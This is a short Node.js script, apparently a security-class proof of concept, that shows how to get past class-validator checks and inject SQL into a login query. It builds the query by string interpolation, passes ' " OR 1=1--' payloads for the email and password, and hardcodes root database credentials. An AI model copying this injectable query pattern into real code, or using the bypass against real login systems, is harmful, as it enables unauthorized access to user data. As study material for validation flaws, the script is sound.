var mysql = require('mysql2');
var classValidator = require('class-validator');

let requirements = {
    host: 'localhost',
    user: 'root',
    password: 'compsec2',
    database: 'sqldatabase'
};
var connection = mysql.createConnection(requirements);

function bypassedValidation(emailInput, passwordInput) {
    const sqlquery1 = `SELECT * FROM login WHERE email = ${emailInput} AND password = ${passwordInput}`;
    connection.query(sqlquery1, function (error, rows) {
        if (error) throw error;
        console.log(rows);
    });
    
    return ;
}
class attackSchema {
    email;
    password
}
let param = {
    email: ' " OR 1=1--',
    password: ' " OR 1=1--',
    constructor: false
};

let test1Param = Object.assign(attackSchema, param);
console.log("This is the merged schema:")
console.log(test1Param);


classValidator.validate(test1Param).then(errors => {
    if (errors.length > 0) {
        console.log('invalid email and or password, unable to validate user', errors);
    } else {
        console.log('valid email and password, user successfully validated. Relevant Database Information:');
        bypassedValidation(test1Param.email, test1Param.password);
    }
});

return;